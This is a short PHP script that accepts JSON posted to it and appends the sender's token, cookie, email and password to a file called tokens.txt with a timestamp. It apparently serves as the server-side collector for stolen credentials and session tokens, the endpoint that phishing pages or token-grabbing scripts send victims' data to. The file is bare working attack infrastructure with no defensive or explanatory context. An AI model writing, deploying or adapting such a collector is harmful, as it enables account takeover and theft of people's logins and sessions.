<?php
$data = json_decode(file_get_contents('php://input'), true);

if ($data && isset($data['token'])) {
    $log = "[" . date('d-m-Y H:i:s') . "]\n";
    $log .= "Token: " . $data['token'] . "\n";
    $log .= "Cookie: " . $data['cookie'] . "\n";
    $log .= "Email/Pass: " . ($data['email'] ?? 'N/A') . " | " . ($data['pass'] ?? 'N/A') . "\n";
    $log .= str_repeat("-", 50) . "\n";

    file_put_contents("tokens.txt", $log, FILE_APPEND);
}
?>
